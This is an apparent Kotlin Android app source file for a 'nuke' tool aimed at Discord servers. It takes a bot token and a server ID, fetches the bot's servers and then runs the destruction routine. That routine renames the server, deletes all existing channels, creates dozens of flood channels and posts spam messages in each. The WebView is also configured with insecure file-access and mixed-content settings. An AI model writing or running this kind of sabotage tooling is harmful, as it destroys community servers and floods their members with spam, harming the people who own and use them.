package com.example

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.os.Bundle
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.OnBackPressedCallback
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONArray
import org.json.JSONObject

class MainActivity : ComponentActivity() {

    private lateinit var webView: WebView
    private val PROTECTED_IDS = listOf("1524449604446322708")

    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
        uri?.let {
            val fileName = it.lastPathSegment ?: "server_icon.png"
            webView.evaluateJavascript("window.onImageSelected('$fileName')", null)
            Toast.makeText(this, "Foto seleccionada: $fileName", Toast.LENGTH_SHORT).show()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        webView = WebView(this).apply {
            setLayerType(View.LAYER_TYPE_HARDWARE, null)
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                databaseEnabled = true
                allowFileAccess = true
                allowFileAccessFromFileURLs = true
                allowUniversalAccessFromFileURLs = true
                useWideViewPort = true
                loadWithOverviewMode = true
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                cacheMode = WebSettings.LOAD_DEFAULT
            }
            webViewClient = WebViewClient()
            addJavascriptInterface(AndroidBridge(this@MainActivity, this, PROTECTED_IDS), "AndroidBridge")
            loadUrl("file:///android_asset/ui/index.html")
        }

        setContentView(webView)

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.canGoBack()) {
                    webView.goBack()
                } else {
                    finish()
                }
            }
        })
    }

    fun launchImagePicker() {
        pickImageLauncher.launch("image/*")
    }

    class AndroidBridge(private val activity: MainActivity, private val webView: WebView, private val protectedIds: List<String>) {

        @JavascriptInterface
        fun pickServerImage() {
            activity.runOnUiThread {
                activity.launchImagePicker()
            }
        }

        @JavascriptInterface
        fun fetchGuilds(token: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val client = OkHttpClient()
                    val request = Request.Builder()
                        .url("https://discord.com/api/v10/users/@me/guilds")
                        .addHeader("Authorization", "Bot $token")
                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                        .build()

                    client.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            val body = response.body?.string() ?: "[]"
                            val jsonArray = JSONArray(body)
                            val guildsList = mutableListOf<JSONObject>()
                            for (i in 0 until jsonArray.length()) {
                                val g = jsonArray.getJSONObject(i)
                                val id = g.getString("id")
                                val name = g.getString("name")
                                val obj = JSONObject().put("id", id).put("name", name)
                                guildsList.add(obj)
                            }
                            val finalJson = guildsList.toString()
                            activity.runOnUiThread {
                                webView.evaluateJavascript("window.renderServers('$finalJson')", null)
                            }
                        } else {
                            activity.runOnUiThread {
                                Toast.makeText(activity, "Error Discord API: ${response.code} (Token inválido o sin permisos)", Toast.LENGTH_LONG).show()
                                webView.evaluateJavascript("window.renderServers('[]')", null)
                            }
                        }
                    }
                } catch (e: Exception) {
                    activity.runOnUiThread {
                        Toast.makeText(activity, "Error de conexión: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                        webView.evaluateJavascript("window.renderServers('[]')", null)
                    }
                }
            }
        }

        @JavascriptInterface
        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String, imageName: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    if (protectedIds.contains(serverId)) {
                        logMsg("[❌] ALERTA DE SEGURIDAD: La ID $serverId está protegida. Operación bloqueada.", "error")
                        return@launch
                    }

                    if (serverId.isEmpty()) {
                        logMsg("[ERROR] Selecciona o introduce un ID de servidor válido", "error")
                        return@launch
                    }

                    val client = OkHttpClient()
                    val limit = channelLimit.toIntOrNull() ?: 30
                    val msgLimit = messageLimit.toIntOrNull() ?: 50
                    val jsonMediaType = "application/json; charset=utf-8".toMediaType()

                    logMsg("[BOT] Conectando bot de Discord y verificando servidor objetivo ID: $serverId...", "info")

                    // 1. Update Server Name
                    val patchBody = RequestBody.create(
                        jsonMediaType,
                        JSONObject().put("name", serverName).toString()
                    )
                    val patchReq = Request.Builder()
                        .url("https://discord.com/api/v10/guilds/$serverId")
                        .patch(patchBody)
                        .addHeader("Authorization", "Bot $token")
                        .addHeader("Content-Type", "application/json")
                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                        .build()

                    client.newCall(patchReq).execute().use { resp ->
                        if (resp.isSuccessful) {
                            logMsg("[+] Nombre del servidor cambiado a: $serverName", "success")
                        } else {
                            logMsg("[-] No se pudo cambiar el nombre del servidor (Código: ${resp.code})", "error")
                        }
                    }

                    // 2. Delete ALL existing channels first
                    logMsg("[*] Eliminando todos los canales existentes...", "info")
                    val getChannelsReq = Request.Builder()
                        .url("https://discord.com/api/v10/guilds/$serverId/channels")
                        .get()
                        .addHeader("Authorization", "Bot $token")
                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                        .build()

                    client.newCall(getChannelsReq).execute().use { chanResp ->
                        if (chanResp.isSuccessful) {
                            val channelsJson = JSONArray(chanResp.body?.string() ?: "[]")
                            for (i in 0 until channelsJson.length()) {
                                val ch = channelsJson.getJSONObject(i)
                                val chId = ch.getString("id")
                                val chName = ch.getString("name")
                                try {
                                    val deleteReq = Request.Builder()
                                        .url("https://discord.com/api/v10/channels/$chId")
                                        .delete()
                                        .addHeader("Authorization", "Bot $token")
                                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                                        .build()
                                    client.newCall(deleteReq).execute().close()
                                    logMsg("[🗑] Canal eliminado: $chName", "success")
                                } catch (e: Exception) {
                                    // ignore individual delete failure
                                }
                            }
                        }
                    }

                    // 3. Create flood channels
                    logMsg("[*] Creando $limit canales de inundación...", "info")
                    for (i in 0 until limit) {
                        try {
                            val chanBody = RequestBody.create(
                                jsonMediaType,
                                JSONObject().put("name", "$channelName-${i + 1}").put("type", 0).toString()
                            )
                            val chanReq = Request.Builder()
                                .url("https://discord.com/api/v10/guilds/$serverId/channels")
                                .post(chanBody)
                                .addHeader("Authorization", "Bot $token")
                                .addHeader("Content-Type", "application/json")
                                .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                                .build()

                            client.newCall(chanReq).execute().use { chanResp ->
                                if (chanResp.isSuccessful) {
                                    val resStr = chanResp.body?.string() ?: "{}"
                                    val chanJson = JSONObject(resStr)
                                    val channelId = chanJson.optString("id")
                                    logMsg("[+] Canal creado: $channelName-${i + 1}", "success")

                                    // 4. Send spam messages
                                    for (m in 0 until msgLimit) {
                                        try {
                                            val msgBody = RequestBody.create(
                                                jsonMediaType,
                                                JSONObject().put("content", messageContent).toString()
                                            )
                                            val msgReq = Request.Builder()
                                                .url("https://discord.com/api/v10/channels/$channelId/messages")
                                                .post(msgBody)
                                                .addHeader("Authorization", "Bot $token")
                                                .addHeader("Content-Type", "application/json")
                                                .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
                                                .build()

                                            client.newCall(msgReq).execute().close()
                                        } catch (e: Exception) {
                                            // ignore individual message error
                                        }
                                    }
                                    logMsg("[+] Inyectados $msgLimit mensajes de spam en $channelName-${i + 1}", "info")
                                }
                            }
                        } catch (e: Exception) {
                            // ignore
                        }
                    }

                    logMsg("[✔] Auto-nuke finalizado con éxito.", "success")
                } catch (e: Exception) {
                    val err = e.localizedMessage?.replace("\"", "\\\"") ?: "Error"
                    logMsg("[❌] ERROR: $err", "error")
                }
            }
        }

        private fun logMsg(msg: String, type: String) {
            val esc = msg.replace("\"", "\\\"").replace("\n", " ")
            activity.runOnUiThread {
                webView.evaluateJavascript("window.appendLog?.('$esc', '$type')", null)
            }
        }

        @JavascriptInterface
        fun showToast(message: String) {
            Toast.makeText(activity, message, Toast.LENGTH_SHORT).show()
        }
    }
}
